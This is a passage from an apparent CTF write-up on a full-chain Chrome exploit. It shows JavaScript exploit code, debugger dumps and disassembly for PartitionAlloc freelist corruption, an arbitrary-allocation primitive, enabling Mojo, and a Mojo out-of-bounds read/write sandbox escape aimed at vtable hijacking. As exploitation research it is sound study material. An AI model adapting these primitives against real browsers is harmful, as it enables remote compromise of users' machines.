        <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">if </span><span class="p">(</span><span class="nx">pa_leak_hi</span> <span class="o">===</span> <span class="kc">undefined</span> <span class="o">||</span> <span class="nx">pa_leak_lo</span> <span class="o">===</span> <span class="kc">undefined</span><span class="p">)</span> <span class="p">{</span>
        <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="p">.</span><span class="nf">reload</span><span class="p">();</span>
    <span class="p">}</span>

    <span class="kd">let</span> <span class="nx">pa_leak</span> <span class="o">=</span> <span class="p">(</span><span class="nc">BigInt</span><span class="p">(</span><span class="nx">pa_leak_hi</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">)</span> <span class="o">|</span> <span class="nc">BigInt</span><span class="p">(</span><span class="nx">pa_leak_lo</span><span class="p">);</span>
    <span class="nx">pa_leak</span> <span class="o">=</span> <span class="nf">byteSwapBigInt</span><span class="p">(</span><span class="nx">pa_leak</span><span class="p">);</span>
<span class="p">...</span>
</pre></table></code></div></div><p>Now that we have a slot address, we can calculate all sorts of useful metadata. An important address is the metadata area, because we can leak the address from chrome binary here. At the same time, we can implement an arbitrary allocate primitive to allocate to any address we want. The constants are taken from <a href="https://source.chromium.org/chromium/chromium/src/+/master:base/allocator/partition_allocator/partition_alloc_constants.h"><code class="language-plaintext highlighter-rouge">partition_alloc_constants.h</code></a></p><div class="language-js highlighter-rouge"><div class="code-header"> <span text-data=" JavaScript "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
</pre><td class="rouge-code"><pre><span class="kd">function</span> <span class="nf">getSuperPageBase</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">let</span> <span class="nx">superPageOffsetMask</span> <span class="o">=</span> <span class="p">(</span><span class="nc">BigInt</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="nc">BigInt</span><span class="p">(</span><span class="mi">21</span><span class="p">))</span> <span class="o">-</span> <span class="nc">BigInt</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="kd">let</span> <span class="nx">superPageBaseMask</span> <span class="o">=</span> <span class="o">~</span><span class="nx">superPageOffsetMask</span><span class="p">;</span>
    <span class="kd">let</span> <span class="nx">superPageBase</span> <span class="o">=</span> <span class="nx">addr</span> <span class="o">&amp;</span> <span class="nx">superPageBaseMask</span><span class="p">;</span>
    <span class="k">return</span> <span class="nx">superPageBase</span><span class="p">;</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nf">getMetadataAreaBaseFromPartitionSuperPage</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">let</span> <span class="nx">superPageBase</span> <span class="o">=</span> <span class="nf">getSuperPageBase</span><span class="p">(</span><span class="nx">addr</span><span class="p">);</span>
    <span class="kd">let</span> <span class="nx">systemPageSize</span> <span class="o">=</span> <span class="nc">BigInt</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">);</span>
    <span class="k">return</span> <span class="nx">superPageBase</span> <span class="o">+</span> <span class="nx">systemPageSize</span><span class="p">;</span>
<span class="p">}</span>

<span class="kd">function</span> <span class="nf">getPartitionPageMetadataArea</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">let</span> <span class="nx">superPageOffsetMask</span> <span class="o">=</span> <span class="p">(</span><span class="nc">BigInt</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="nc">BigInt</span><span class="p">(</span><span class="mi">21</span><span class="p">))</span> <span class="o">-</span> <span class="nc">BigInt</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="kd">let</span> <span class="nx">partitionPageIndex</span> <span class="o">=</span> <span class="p">(</span><span class="nx">addr</span> <span class="o">&amp;</span> <span class="nx">superPageOffsetMask</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="nc">BigInt</span><span class="p">(</span><span class="mi">14</span><span class="p">);</span>
    <span class="kd">let</span> <span class="nx">pageMetadataSize</span> <span class="o">=</span> <span class="nc">BigInt</span><span class="p">(</span><span class="mh">0x20</span><span class="p">);</span>
    <span class="kd">let</span> <span class="nx">partitionPageMetadataPtr</span> <span class="o">=</span> <span class="nf">getMetadataAreaBaseFromPartitionSuperPage</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="o">+</span> <span class="nx">partitionPageIndex</span> <span class="o">*</span> <span class="nx">pageMetadataSize</span><span class="p">;</span>
    <span class="k">return</span> <span class="nx">partitionPageMetadataPtr</span><span class="p">;</span>
<span class="p">}</span>

<span class="kd">let</span> <span class="nx">page_leak</span> <span class="o">=</span> <span class="nx">pa_leak</span><span class="p">;</span>
<span class="nx">metadata_base</span> <span class="o">=</span> <span class="nf">getMetadataAreaBaseFromPartitionSuperPage</span><span class="p">(</span><span class="nx">page_leak</span><span class="p">);</span>
<span class="nx">metadata_area</span> <span class="o">=</span> <span class="nf">getPartitionPageMetadataArea</span><span class="p">(</span><span class="nx">page_leak</span><span class="p">);</span>

<span class="kd">function</span> <span class="nf">arb_alloc</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">l_alloc_ab</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ArrayBuffer</span><span class="p">(</span><span class="mi">8</span> <span class="o">*</span> <span class="mi">6</span><span class="p">);</span>
    <span class="nx">no_gc</span><span class="p">.</span><span class="nf">push</span><span class="p">(</span><span class="nx">l_alloc_ab</span><span class="p">);</span>
    <span class="nx">l_alloc_arr</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">BigUint64Array</span><span class="p">(</span><span class="nx">l_alloc_ab</span><span class="p">);</span>
    <span class="c1">// Marker for debugging</span>
    <span class="nx">l_alloc_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x1337133713371337</span><span class="nx">n</span><span class="p">;</span>

    <span class="kd">let</span> <span class="nx">addr_big</span> <span class="o">=</span> <span class="nf">byteSwapBigInt</span><span class="p">(</span><span class="nc">BigInt</span><span class="p">(</span><span class="nx">addr</span><span class="p">));</span>
    <span class="nx">write64_ta</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">addr_big</span><span class="p">;</span>
    <span class="nx">l_alloc_arr</span><span class="p">.</span><span class="nf">set</span><span class="p">(</span><span class="nx">write64_ta</span><span class="p">,</span> <span class="mi">6</span><span class="p">);</span>

    <span class="kd">let</span> <span class="nx">inverted_addr</span> <span class="o">=</span> <span class="nx">addr_big</span> <span class="o">^</span> <span class="mh">0xffffffff</span><span class="nx">_ffffffffn</span><span class="p">;</span>
    <span class="nx">write64_ta</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">inverted_addr</span><span class="p">;</span>
    <span class="nx">l_alloc_arr</span><span class="p">.</span><span class="nf">set</span><span class="p">(</span><span class="nx">write64_ta</span><span class="p">,</span> <span class="mi">7</span><span class="p">);</span>

    <span class="nx">tmp</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ArrayBuffer</span><span class="p">(</span><span class="mi">8</span> <span class="o">*</span> <span class="mi">6</span><span class="p">);</span>
    <span class="nx">no_gc</span><span class="p">.</span><span class="nf">push</span><span class="p">(</span><span class="nx">tmp</span><span class="p">);</span>

    <span class="nx">tmp</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ArrayBuffer</span><span class="p">(</span><span class="mi">8</span> <span class="o">*</span> <span class="mi">6</span><span class="p">);</span>
    <span class="nx">no_gc</span><span class="p">.</span><span class="nf">push</span><span class="p">(</span><span class="nx">tmp</span><span class="p">);</span>

    <span class="k">return</span> <span class="nx">tmp</span><span class="p">;</span>

<span class="p">}</span>
</pre></table></code></div></div><p>Now let’s take a look at the data in the metadata area to see what we can do here.</p><pre><code class="language-gdb">[+] metadata rel base = 0x00002c6001201000
[+] metadata area = 0x00002c6001201080

...

pwndbg&gt; tele 0x00002c6001201000 40
00:0000│  0x2c6001201000 —▸ 0x5628681b60c8 (WTF::Partitions::InitializeOnce()::array_buffer_allocator) ◂— 0x10001000001
01:0008│  0x2c6001201008 —▸ 0x2c6001200000 ◂— 0x0
02:0010│  0x2c6001201010 —▸ 0x2c6001400000 ◂— 0x0
03:0018│  0x2c6001201018 ◂— 0x0
... ↓     8 skipped
0c:0060│  0x2c6001201060 —▸ 0x2c600120c280 ◂— 0xa0c22001602c0000
0d:0068│  0x2c6001201068 ◂— 0x0
0e:0070│  0x2c6001201070 —▸ 0x5628681b60d8 (WTF::Partitions::InitializeOnce()::array_buffer_allocator+16) —▸ 0x2c6001201060 —▸ 0x2c600120c280 ◂— 0xa0c22001602c0000
0f:0078│  0x2c6001201078 ◂— 0x10000ff03000007
10:0080│  0x2c6001201080 —▸ 0x2c6001210710 ◂— 0x20072101602c0000
11:0088│  0x2c6001201088 ◂— 0x0
12:0090│  0x2c6001201090 —▸ 0x5628681b6218 (WTF::Partitions::InitializeOnce()::array_buffer_allocator+336) —▸ 0x2c6001201080 —▸ 0x2c6001210710 ◂— 0x20072101602c0000
13:0098│  0x2c6001201098 ◂— 0x10000fffa950003
14:00a0│  0x2c60012010a0 ◂— 0x0
15:00a8│  0x2c60012010a8 ◂— 0x0
16:00b0│  0x2c60012010b0 —▸ 0x5628681b62b8 (WTF::Partitions::InitializeOnce()::array_buffer_allocator+496) —▸ 0x2c60012010a0 ◂— 0x0
17:00b8│  0x2c60012010b8 ◂— 0x10000ff03590006
18:00c0│  0x2c60012010c0 ◂— 0x0
... ↓     2 skipped
1b:00d8│  0x2c60012010d8 ◂— 0x101000000000000
1c:00e0│  0x2c60012010e0 ◂— 0x0
... ↓     2 skipped
1f:00f8│  0x2c60012010f8 ◂— 0x102000000000000
20:0100│  0x2c6001201100 —▸ 0x2c6001220040 ◂— 0x80002201602c0000
21:0108│  0x2c6001201108 ◂— 0x0
22:0110│  0x2c6001201110 —▸ 0x5628681b6358 (WTF::Partitions::InitializeOnce()::array_buffer_allocator+656) —▸ 0x2c6001201100 —▸ 0x2c6001220040 ◂— 0x80002201602c0000
23:0118│  0x2c6001201118 ◂— 0x10000ff00c00001
24:0120│  0x2c6001201120 ◂— 0x0

</code></pre><p>The layout of the metadata page is also described in <a href="https://source.chromium.org/chromium/chromium/src/+/master:base/allocator/partition_allocator/partition_alloc_constants.h;drc=a497519413dd3fcff5136eb88d3d4974e8696a6b;l=135"><code class="language-plaintext highlighter-rouge">partition_alloc_constants.h</code></a></p><p>Indeed, there are pointers to the chrome binary. To be able to read this data, we need to do arb_alloc to one of these addresses within the metadata area. Now, remember the check in <code class="language-plaintext highlighter-rouge">GetNext()</code>? We need to bypass it here to allocate to where we want. This is where I made my first mistake: I tried to allocate right to <code class="language-plaintext highlighter-rouge">0x2c6001201080</code>, where there is non-null data. There were 2 important things I forgot when I did that:</p><ul><li>The allocated memory will be initialized with 0s. If we zeroes out the metadata, the process is likely to crash when PA tries to alloc/free.<li>Allocating to an address with non-null data requires crafting the inverted pointer right after that, because when the desired address is the freelist head, <code class="language-plaintext highlighter-rouge">GetNext()</code> will be called on it to make the <code class="language-plaintext highlighter-rouge">next_</code> pointer the freelist head. This basically means that we need to write to metadata area if we want to allocate here.</ul><p>I was stuck here for a while, because I could not just allocate to the address with the chrome data, and if I allocated to an addreses before <code class="language-plaintext highlighter-rouge">0x2c6001201080</code>), it would erase the metadata, leading to a crash very soon. Allocating to addresses far below (<code class="language-plaintext highlighter-rouge">0x2c6001201120</code>, for example) did not seem interesting to me because it was just 0s. This turned out to be a huge mistake I made. After the CTF, I asked <a href="https://twitter.com/harsh_khuha">@harsh_khuha</a> and was told that if I allocate the right size, the metadata will be populated. The reason there were a bunch of 0s was because no slot of that size was requested.</p><p>Based on that, obtaining a leak is simple now:</p><ol><li>Allocate to an address in metadata area with 0s and calculate the size of the slot span pointed to by the partition page at that address. For example, at <code class="language-plaintext highlighter-rouge">0x2c6001201080</code>, there is the metadata for slot span of size 32B. Since each partition page is 32B, the next page is <code class="language-plaintext highlighter-rouge">0x2c6001201080 + 0x20 = 0x2c60012010a0</code>. Be aware that some pages are unused and data is not populated there.<li>Simply allocate an ArrayBuffer with that size</ol><div class="language-js highlighter-rouge"><div class="code-header"> <span text-data=" JavaScript "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="c1">// Now this points to slot span of size 64B</span>
<span class="nx">metadata_area</span> <span class="o">+=</span> <span class="mh">0x80</span><span class="nx">n</span><span class="p">;</span>

<span class="nx">tmp</span> <span class="o">=</span> <span class="nf">arb_alloc</span><span class="p">(</span><span class="nx">metadata_area</span><span class="p">);</span>
<span class="nx">tmpa</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">BigUint64Array</span><span class="p">(</span><span class="nx">tmp</span><span class="p">);</span>

<span class="c1">// Allocate corresponding size to populate with leak</span>
<span class="nx">leak_me</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ArrayBuffer</span><span class="p">(</span><span class="mi">8</span> <span class="o">*</span> <span class="mi">8</span><span class="p">);</span>
<span class="nx">chrome_leak</span> <span class="o">=</span> <span class="nx">tmpa</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
</pre></table></code></div></div><p>From here, it is just a matter of calculating the chrome binary base, and arb_alloc to <code class="language-plaintext highlighter-rouge">is_mojo_js_enabled_</code>. One can find the offset of this data using <code class="language-plaintext highlighter-rouge">readelf</code></p><div class="language-zsh highlighter-rouge"><div class="code-header"> <span text-data=" Shell "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>➜  ggctf readelf <span class="nt">-s</span> <span class="nt">-W</span> chrome | <span class="nb">grep </span>is_mojo_js_enabled_
698090: 000000000c5a0abe     1 OBJECT  LOCAL  HIDDEN    31 _ZN5blink26RuntimeEnabledFeaturesBase19is_mojo_js_enabled_E
</pre></table></code></div></div><p>Also note that because mojo is disabled, the data at this address is 0x0, which is quite fortunate to do arb_alloc. Even if it was not, simply finding a suitable address around that would not be too difficult. Now after mojo has been enabled, I did not do <code class="language-plaintext highlighter-rouge">window.location.reload()</code> but instead opened an iframe, because I did not want the messed up allocations to be garbage collected. Otherwise it would crash.</p><p><img data-proofer-ignore data-src="/assets/img/fullchain/renderer.png" alt="renderer" /></p><h2 id="sandbox-escape">Sandbox Escape</h2><h3 id="31-the-bug---sandbox">3.1. The Bug - Sandbox</h3><p>Looking at the patch file, we can see that it implements a Mojo interface named <code class="language-plaintext highlighter-rouge">CtfInterface</code>, with 3 methods:</p><ul><li><code class="language-plaintext highlighter-rouge">Read</code>: Unchecked data read, we can read at any offset<li><code class="language-plaintext highlighter-rouge">Write</code>: Unchecked data write, we can write a double value at any offset<li><code class="language-plaintext highlighter-rouge">ResizeVector</code>: This calls <code class="language-plaintext highlighter-rouge">resize</code> on the <code class="language-plaintext highlighter-rouge">std::vector&lt;double&gt; numbers_</code> member of the implementation.</ul><p>To start interacting with the <code class="language-plaintext highlighter-rouge">numbers_</code> vector, we first need to call <code class="language-plaintext highlighter-rouge">ResizeVector</code> to get it allocated. Only then can we read and write on it.</p><div class="language-js highlighter-rouge"><div class="code-header"> <span text-data=" JavaScript "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="kd">var</span> <span class="nx">ctf_ptr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">blink</span><span class="p">.</span><span class="nx">mojom</span><span class="p">.</span><span class="nc">CtfInterfacePtr</span><span class="p">();</span>
<span class="kd">var</span> <span class="nx">ctf_name</span> <span class="o">=</span> <span class="nx">blink</span><span class="p">.</span><span class="nx">mojom</span><span class="p">.</span><span class="nx">CtfInterface</span><span class="p">.</span><span class="nx">name</span><span class="p">;</span>
<span class="kd">var</span> <span class="nx">ctf_rq</span> <span class="o">=</span> <span class="nx">mojo</span><span class="p">.</span><span class="nf">makeRequest</span><span class="p">(</span><span class="nx">ctf_ptr</span><span class="p">);</span>
<span class="nx">Mojo</span><span class="p">.</span><span class="nf">bindInterface</span><span class="p">(</span><span class="nx">ctf_name</span><span class="p">,</span> <span class="nx">ctf_rq</span><span class="p">.</span><span class="nx">handle</span><span class="p">);</span>
<span class="p">(</span><span class="k">async </span><span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="k">await</span> <span class="nx">ctf_ptr</span><span class="p">.</span><span class="nf">resizeVector</span><span class="p">(</span><span class="mh">0x20</span><span class="o">/</span><span class="mi">8</span><span class="p">);</span>
    <span class="k">await</span> <span class="nx">ctf_ptr</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="nf">itof</span><span class="p">(</span><span class="mh">0x1337133713371337</span><span class="nx">n</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>

    <span class="c1">// Do pwn here...</span>
<span class="p">})();</span>
</pre></table></code></div></div><p>Note that any method call on the interface pointer needs to be <code class="language-plaintext highlighter-rouge">await</code> inside an <code class="language-plaintext highlighter-rouge">async</code> function. Also, the argument for <code class="language-plaintext highlighter-rouge">resizeVector</code> is in double elements, not bytes. Here if I want to allocate <code class="language-plaintext highlighter-rouge">0x20</code> bytes, I would need to pass in <code class="language-plaintext highlighter-rouge">0x20/8</code>.</p><p>Now let’s start the great escape…</p><h3 id="32-exploit-strategy---sandbox">3.2. Exploit Strategy - Sandbox</h3><p>The strategy here is quite straight-forward. It is similar to PlaidCTF 2020 PlaidStore that my teammate ntrung03 also has a write-up <a href="https://trungnguyen1909.github.io/blog/post/PlaidCTF2020/">here</a>. Basically, the plan is to spray some data structure and hope that we can use the OOB read/write to overwrite the object’s vtable, and then we get code execution by calling the method on our fake vtable.</p><p>Just like the renderer exploit, we have a few tasks to do before we can get ultimate code execution:</p><ol><li>We need to figure out the size of the object we want to spray so that we allocate our vectors correspondingly. Here I chose to spray the <code class="language-plaintext highlighter-rouge">CtfInterface</code> for simplicity.<li>We need to have a leak to calculate chrome base address.<li>We need to have a write primitive to write our ROP chain or shellcode somewhere, or we need to know the address of the vectors that we control if we decide to write ROP chain/shellcode here.</ol><p>To figure out the size of <code class="language-plaintext highlighter-rouge">CtfInterface</code>, we can follow the method that instantiates the object: <code class="language-plaintext highlighter-rouge">_ZN7content16CtfInterfaceImpl6CreateEN4mojo15PendingReceiverIN5blink5mojom12CtfInterfaceEEE</code>. It would be easier to follow in a debug build with some symbol, but if not, we can still guess what is the size here</p><pre><code class="language-gdb">   0x0000559e9cc811a0 &lt;+0&gt;:	push   rbp
   0x0000559e9cc811a1 &lt;+1&gt;:	mov    rbp,rsp
   0x0000559e9cc811a4 &lt;+4&gt;:	push   r15
   0x0000559e9cc811a6 &lt;+6&gt;:	push   r14
   0x0000559e9cc811a8 &lt;+8&gt;:	push   r13
   0x0000559e9cc811aa &lt;+10&gt;:	push   r12
   0x0000559e9cc811ac &lt;+12&gt;:	push   rbx
   0x0000559e9cc811ad &lt;+13&gt;:	sub    rsp,0x68
   0x0000559e9cc811b1 &lt;+17&gt;:	mov    r15,rdi
   0x0000559e9cc811b4 &lt;+20&gt;:	mov    edi,0x20
   0x0000559e9cc811b9 &lt;+25&gt;:	call   0x559e9e731190 &lt;_Znwm&gt;
=&gt; 0x0000559e9cc811be &lt;+30&gt;:	mov    rbx,rax
</code></pre><p>We see that <code class="language-plaintext highlighter-rouge">edi</code> is <code class="language-plaintext highlighter-rouge">0x20</code> in the first call here so we can try to allocate our vectors with the same size, and look in gdb if they end up at the same page. They are, indeed :D</p><pre><code class="language-gdb"># Search for the marker value
pwndbg&gt; search --qword -w 0x1337133713371337
    0x2d020112d180 0x1337133713371337
    0x2d0201230f00 0x1337133713371337
    0x2d020134d4f0 0x1337133713371337
    0x2d020134d5f0 0x1337133713371337

# Search for the vector pointer address. The object will have this.
pwndbg&gt; search --qword -w 0x2d020112d180
                0x2d0201b4ec08 0x2d020112d180

pwndbg&gt; tele 0x2d0201b4ec08-0x20
00:0000│  0x2d0201b4ebe8 ◂— 0x2fd
01:0008│  0x2d0201b4ebf0 ◂— 0xdead016d000002fd
02:0010│  0x2d0201b4ebf8 ◂— 0xdeadbeefdeadbeef
03:0018│  0x2d0201b4ec00 —▸ 0x556bb2e51f90 —▸ 0x556babcf6130 (content::CtfInterfaceImpl::~CtfInterfaceImpl()) ◂— push   rbp
04:0020│  0x2d0201b4ec08 —▸ 0x2d020112d180 ◂— 0x1337133713371337
05:0028│  0x2d0201b4ec10 —▸ 0x2d020112d1a0 —▸ 0x2d02014835a0 ◂— 0x100000000
06:0030│  0x2d0201b4ec18 —▸ 0x2d020112d1a0 —▸ 0x2d02014835a0 ◂— 0x100000000
07:0038│  0x2d0201b4ec20 ◂— 0x1
</code></pre><p>At this point, we can start looking for leak. An easy value to leak is the vtable address of the interface, because it is an address in the chrome binary. We just need to scan the page for values ending with some value that looks like our vtable (ending with <code class="language-plaintext highlighter-rouge">0xf90</code>, for example here).</p><p>We can also start an arbitrary read/write primitive here. Because the vtable is right next to the vector pointer, we can alter the vector pointer and search within our allocated vectors to see which one is affected. We then know that we can control its vector for arbitrary read/write. When I did this, I noticed that it may be unstable, so it is best to save the original vector pointer and restore it after we have done read/write.</p><div class="language-js highlighter-rouge"><div class="code-header"> <span text-data=" JavaScript "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
</pre><td class="rouge-code"><pre><span class="k">for </span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">20</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">ptr</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">blink</span><span class="p">.</span><span class="nx">mojom</span><span class="p">.</span><span class="nc">CtfInterfacePtr</span><span class="p">();</span>
    <span class="kd">var</span> <span class="nx">rq</span> <span class="o">=</span> <span class="nx">mojo</span><span class="p">.</span><span class="nf">makeRequest</span><span class="p">(</span><span class="nx">ptr</span><span class="p">);</span>
    <span class="nx">Mojo</span><span class="p">.</span><span class="nf">bindInterface</span><span class="p">(</span><span class="nx">ctf_name</span><span class="p">,</span> <span class="nx">rq</span><span class="p">.</span><span class="nx">handle</span><span class="p">);</span>
    <span class="k">await</span> <span class="nx">ptr</span><span class="p">.</span><span class="nf">resizeVector</span><span class="p">(</span><span class="mh">0x20</span><span class="o">/</span><span class="mi">8</span><span class="p">);</span>
    <span class="c1">// Marker value</span>
    <span class="k">await</span> <span class="nx">ptr</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="nf">itof</span><span class="p">(</span><span class="mh">0x1337133713371337</span><span class="nx">n</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
    <span class="k">await</span> <span class="nx">ptr</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="nf">itof</span><span class="p">(</span><span class="mh">0x414142424343</span><span class="nx">n</span><span class="p">),</span> <span class="mi">3</span><span class="p">);</span>
    <span class="nx">not_gc</span><span class="p">.</span><span class="nf">push</span><span class="p">(</span><span class="nx">ptr</span><span class="p">);</span>
<span class="p">}</span>

<span class="kd">let</span> <span class="nx">vtable_leak</span> <span class="o">=</span> <span class="mi">0</span><span class="nx">n</span><span class="p">;</span>
<span class="kd">let</span> <span class="nx">corrupt_ptr</span> <span class="o">=</span> <span class="kc">undefined</span><span class="p">;</span>
<span class="kd">let</span> <span class="nx">corrupt_idx</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
<span class="kd">let</span> <span class="nx">rw_ptr</span>  <span class="o">=</span> <span class="kc">undefined</span><span class="p">;</span>
<span class="kd">let</span> <span class="nx">restore</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>

<span class="k">for </span><span class="p">(</span><span class="kd">var</span> <span class="nx">ptr</span> <span class="k">of</span> <span class="nx">not_gc</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">for </span><span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">50</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="kd">let</span> <span class="nx">v</span> <span class="o">=</span> <span class="nf">ftoi</span><span class="p">((</span><span class="k">await</span> <span class="nx">ptr</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="nx">i</span><span class="p">)).</span><span class="nx">value</span><span class="p">);</span>
        <span class="c1">// Scan for the vtable address ending</span>
        <span class="k">if </span><span class="p">(</span><span class="nx">vtable_leak</span> <span class="o">==</span> <span class="mi">0</span><span class="nx">n</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">v</span> <span class="o">&amp;</span> <span class="mh">0xfff</span><span class="nx">n</span><span class="p">)</span> <span class="o">==</span> <span class="nx">offset_leak_sbx</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">vtable_leak</span> <span class="o">=</span> <span class="nx">v</span><span class="p">;</span>
            <span class="c1">// This saves the original vector address</span>
            <span class="nx">restore</span> <span class="o">=</span> <span class="p">(</span><span class="k">await</span> <span class="nx">ptr</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="nx">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)).</span><span class="nx">value</span><span class="p">;</span>

            <span class="c1">// Try to alter the vector pointer and look in our allocated vectors</span>
            <span class="c1">// to see which one we are controlling.</span>
            <span class="k">await</span> <span class="nx">ptr</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="nf">itof</span><span class="p">(</span><span class="nx">vtable_leak</span><span class="p">),</span> <span class="nx">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
            <span class="k">for </span><span class="p">(</span><span class="kd">var</span> <span class="nx">ptr1</span> <span class="k">of</span> <span class="nx">not_gc</span><span class="p">)</span> <span class="p">{</span>
                <span class="kd">let</span> <span class="nx">v1</span> <span class="o">=</span> <span class="nf">ftoi</span><span class="p">((</span><span class="k">await</span> <span class="nx">ptr1</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">)).</span><span class="nx">value</span><span class="p">);</span>
                <span class="k">if </span><span class="p">(</span><span class="nx">v1</span> <span class="o">!=</span> <span class="mh">0x1337133713371337</span><span class="nx">n</span><span class="p">)</span> <span class="p">{</span>
                    <span class="nx">rw_ptr</span> <span class="o">=</span> <span class="nx">ptr1</span><span class="p">;</span>
                    <span class="k">await</span> <span class="nx">ptr</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="nx">restore</span><span class="p">,</span> <span class="nx">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
                    <span class="k">break</span><span class="p">;</span>
                <span class="p">}</span>
            <span class="p">}</span>

            <span class="nx">corrupt_idx</span> <span class="o">=</span> <span class="nx">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
            <span class="nx">corrupt_ptr</span> <span class="o">=</span> <span class="nx">ptr</span><span class="p">;</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">if </span><span class="p">(</span><span class="nx">vtable_leak</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">async</span> <span class="kd">function</span> <span class="nf">arb_read</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">await</span> <span class="nx">corrupt_ptr</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="nf">itof</span><span class="p">(</span><span class="nx">addr</span><span class="p">),</span> <span class="nx">corrupt_idx</span><span class="p">);</span>
    <span class="kd">let</span> <span class="nx">res</span> <span class="o">=</span> <span class="p">(</span><span class="k">await</span> <span class="nx">rw_ptr</span><span class="p">.</span><span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">)).</span><span class="nx">value</span><span class="p">;</span>
